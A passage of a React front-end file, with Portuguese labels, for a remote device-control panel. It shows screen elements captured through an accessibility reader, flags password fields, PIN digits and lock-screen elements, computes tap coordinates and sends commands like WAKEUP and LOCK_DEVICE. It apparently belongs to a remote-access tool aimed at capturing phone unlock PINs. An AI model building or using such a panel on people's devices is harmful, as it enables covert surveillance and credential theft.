                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: 6 }}>
                      <div style={{ flex: 1, minWidth: 0 }}>
                        {n.text && <div style={{ fontWeight: 600, fontSize: 12, color: n.password ? '#ff5c80' : 'var(--text)', marginBottom: 2, wordBreak: 'break-word' }}>{n.password ? '🔑 ' : ''}{n.text}</div>}
                        <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {n.cls.split('.').pop()}{n.id ? ` #${n.id.split('/').pop()}` : ''}
                        </div>
                      </div>
                      <div style={{ display: 'flex', gap: 3, flexWrap: 'wrap', justifyContent: 'flex-end', flexShrink: 0 }}>
                        {n.clickable  && <span className="pill pill-gold"   style={{ fontSize: 8, padding: '1px 5px' }}>CLICK</span>}
                        {n.editable   && <span className="pill pill-blue"   style={{ fontSize: 8, padding: '1px 5px' }}>EDIT</span>}
                        {n.password   && <span className="pill pill-red"    style={{ fontSize: 8, padding: '1px 5px' }}>PWD</span>}
                        {n.scrollable && <span className="pill pill-blue"   style={{ fontSize: 8, padding: '1px 5px' }}>SCROLL</span>}
                        {n.checked    && <span className="pill pill-green"  style={{ fontSize: 8, padding: '1px 5px' }}>✓ON</span>}
                        {!n.enabled   && <span className="pill pill-dim"    style={{ fontSize: 8, padding: '1px 5px' }}>OFF</span>}
                        {n.isPinDigit && <span style={{ fontSize: 8, padding: '1px 5px', borderRadius: 3, background: 'rgba(152,85,232,.15)', color: '#a855f7', border: '1px solid rgba(152,85,232,.3)' }}>PIN</span>}
                        {n.isLockEl   && <span className="pill pill-dim"    style={{ fontSize: 8, padding: '1px 5px' }}>LOCK</span>}
                      </div>
                    </div>
                    {n.bounds && (
                      <div style={{ fontSize: 9, color: 'var(--text3)', marginTop: 3, fontFamily: 'var(--mono)' }}>
                        x:{n.bounds.x} y:{n.bounds.y} {n.bounds.w}×{n.bounds.h}
                        {n.clickable && <span style={{ color: 'var(--text2)', marginLeft: 6 }}>→tap({Math.round(n.bounds.x+n.bounds.w/2)},{Math.round(n.bounds.y+n.bounds.h/2)})</span>}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </>
          )}

          {/* ── RAW JSON ── */}
          {v2tab === 'raw' && (
            <>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                <span style={{ fontSize: 11, color: 'var(--text2)' }}>
                  {rawJson.length.toLocaleString()} chars · {curPkg || '—'}
                </span>
                <button onClick={() => navigator.clipboard?.writeText(rawJson).catch(() => {})}
                  style={{ fontSize: 10, padding: '2px 8px', borderRadius: 5, border: '1px solid var(--gold-border)', background: 'var(--bg3)', color: 'var(--text2)', cursor: 'pointer' }}>
                  📋 COPIAR
                </button>
              </div>
              <div style={{
                background: '#030305', border: '1px solid var(--gold-border)', borderRadius: 8,
                padding: 10, height: 380, overflowY: 'auto', overflowX: 'auto',
                fontFamily: 'var(--mono)', fontSize: 10, color: 'var(--text2)',
                whiteSpace: 'pre', lineHeight: 1.5,
              }}>
                {rawJson || 'Nenhum dado. Ative Screen Reader V2.'}
              </div>
            </>
          )}
        </div>
      )}

      {/* ── Nav shortcuts ── */}
      <div style={{ marginTop: 14, marginBottom: 4, fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5 }}>
        NAVEGAÇÃO
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 6 }}>
        {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['💡','WAKEUP'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['🔒','LOCK_DEVICE'],['📷','SNAP_SCREEN']
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>
    </div>
  );
}

// ── Sub-components ─────────────────────────────────────────────────────────────
function SectionHdr({ icon, label }) {
  return (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 6, marginTop: 14, marginBottom: 6,
      fontSize: 11, fontWeight: 700, color: 'var(--gold)', letterSpacing: 1.5,
      textTransform: 'uppercase',
    }}>
      <span>{icon}</span>
      {label}
      <div style={{ flex: 1, height: 1, background: 'rgba(212,149,10,.2)', marginLeft: 4 }} />
    </div>
  );
}

// Brown button with state badge below — matching reference image exactly
function CtrlBtn({ label, state, onClick }) {
  return (
    <div onClick={onClick} style={{
      background: 'linear-gradient(135deg,rgba(60,35,5,.9),rgba(40,25,3,.9))',
      border: '1px solid rgba(212,149,10,.25)', borderRadius: 10,
      padding: '12px 16px', marginBottom: 6, cursor: 'pointer',
      textAlign: 'center', transition: 'background .12s, border-color .12s',
    }}>
      <div style={{ fontWeight: 700, fontSize: 14, color: '#e8e0d0' }}
        dangerouslySetInnerHTML={{ __html: label }} />
      {state != null && (
        <div style={{ fontSize: 10, color: state === 'true' ? '#00c864' : 'rgba(200,190,180,.35)', marginTop: 3 }}>
          {state}
        </div>
      )}
    </div>
  );
}

// Button with value on the right side
function CtrlBtnSide({ label, right, onClick }) {
  return (
    <div onClick={onClick} style={{
      background: 'linear-gradient(135deg,rgba(60,35,5,.9),rgba(40,25,3,.9))',
      border: '1px solid rgba(212,149,10,.25)', borderRadius: 10,
      padding: '12px 16px', marginBottom: 6, cursor: 'pointer',
      display: 'flex', alignItems: 'center', transition: 'background .12s',
    }}>
      <span style={{ fontWeight: 700, fontSize: 14, color: '#e8e0d0', flex: 1 }}
        dangerouslySetInnerHTML={{ __html: label }} />
      {right != null && (
        <span style={{ fontSize: 11, color: right === 'true' ? '#00c864' : 'rgba(200,190,180,.35)' }}>
          {right}
        </span>
      )}
    </div>
  );
}
